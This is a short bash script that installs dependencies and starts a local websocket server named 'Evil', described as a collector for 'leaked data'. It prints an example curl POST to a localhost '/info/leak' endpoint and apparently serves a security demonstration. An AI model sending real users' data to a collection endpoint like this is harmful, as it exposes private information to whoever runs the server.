#!/bin/bash
echo "Installing required dependencies (node modules)"
npm install

echo "Running backend web socket server named 'Evil'..."
echo "  Open your browser at http://localhost:7777/"

# open http://localhost:7777/

echo "You can send leaked data to this server via post requests"
echo "  e.g. "
echo "  curl  -X POST 'http://localhost:7777/info/leak' -H 'Content-Type:text/plain' --data \"Abc\""

tsc public/js/websocketlogic.ts


echo "Running the 'evil' data collection server"
# optional: set other port and run
# PORT=8765 npm run dev 
npm run dev

# not reachable